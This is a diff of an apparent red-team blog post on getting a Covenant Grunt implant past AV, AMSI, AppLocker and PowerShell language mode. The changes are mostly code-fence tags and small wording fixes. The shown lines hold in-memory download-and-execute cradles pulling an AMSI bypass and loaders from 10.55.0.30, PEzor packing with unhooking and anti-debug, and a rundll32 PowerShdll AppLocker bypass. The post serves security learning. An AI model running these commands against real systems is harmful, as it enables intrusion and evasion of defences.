@@ -95,7 +95,7 @@ By now you should know what to do :) Obfuscate the templates.
 
 Another approach is to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading or writing data.  
 The most well known technique to me is to use PowerShell´s native Invoke Expression function. It will allow you to download a script from a remote source and execute it in memory.  
-```
+```powershell
 iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')
 ```  
 
@@ -133,18 +133,18 @@ Just to try to avoid local detection when copied to disk.
    ![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  
 
 2. Convert Grunt.exe to Nim byte array  
-   ```
+   ```powershell
    CSharpToNimByteArray -inputfile .\GruntHTTP.exe
    ```
    ![broken]({{ site.baseurl }}/images/2021-16-01/Convert_Grunt_to_array.png "convert to byte array")   
 
 3. Paste the byte array into the C# loader [template](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim) and build the C    executable  
-   ```
+   ```powershell
    nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim
    ```
 
 4. Wrap the C executable into PEZor  
-   ```
+   ```bash
    PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
    ```
    ![broken]({{ site.baseurl }}/images/2021-16-01/Building_PEZor.png "PEZor build")  
@@ -165,12 +165,12 @@ The whole attack is carried out on a low priv account.
    ![broken]({{ site.baseurl }}/images/2021-16-01/everything_blocked.png  "All blocked")
 
    To check the current PS language mode we can run:  
-   ```
+   ```powershell
    $ExecutionContext.SessionState.LanguageMode
    ```  
 
    We can issue the following PS cmdlet to identify all AppLocker policies in place:  
-   ```
+   ```powershell
    Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml
    ```  
 
@@ -179,7 +179,7 @@ The whole attack is carried out on a low priv account.
    We can see that the **Everyone** group is allowed to run stuff from *C:\Program Files (x86)\hMailServer\\*\*
 
    We can further check the ACLs on that folder with the following PS cmdlet:  
-   ```
+   ```powershell
    Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl
    ```  
 
@@ -192,7 +192,7 @@ The whole attack is carried out on a low priv account.
    So now that we know how - let´s get our hands dirty.  
 
    Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy the dll to the client to **C:\Program Files (x86)\hMailServer\\*\* and run it:  
-   ```
+   ```powershell
    rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
    ```  
 
@@ -201,7 +201,7 @@ The whole attack is carried out on a low priv account.
 3. Prepare Invoke-SharpLoader  
 
     Encrypt our default Grunt.exe    
-    ```
+    ```powershell
     . .\Invoke-SharpEncrypt.ps1  
     Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP.exe -password LuemmelSec -outfile C:\users\Luemmel\Desktop\Grunt_SharpLoader.enc  
     ``` 
@@ -210,8 +210,8 @@ The whole attack is carried out on a low priv account.
 
     Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```
 
-    Adapt the Invoke-SharpLoader script to have it directly run with our encrypted payload by adding this to the last line:  
-    ```
+    Adapt the Invoke-SharpLoader script to directly load our encrypted payload from the webserver by adding this to the last line:  
+    ```powershell
     Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs
     ```
 
@@ -222,7 +222,7 @@ The whole attack is carried out on a low priv account.
 4. Execute our Powershell load script  
     
     In the last step we put together a short script that we can call from our PowerShdll which looks like this:  
-    ```
+    ```powershell
     iex(new-object net.webclient).downloadstring('http://10.55.0.30/amsibypass');
     iex(new-object net.webclient).downloadstring('http://10.55.0.30/Invoke-SharpLoader');
     ```
@@ -240,7 +240,7 @@ The whole attack is carried out on a low priv account.
 
 ### Conclusion  
 
-We have seen that Blue Team has lots of possibilities to make an attackers life much harder.  
+We have seen that the Blue Team has lots of possibilities to make an attackers life much harder.  
 Keep your security products up to date, and implement them correctly.  
 Make use of all the nice features that your OS or security product provider is offering you.  
 Play with the stuff you learned here to get a better understanding of your infrastructure and detect your weakpoints.  
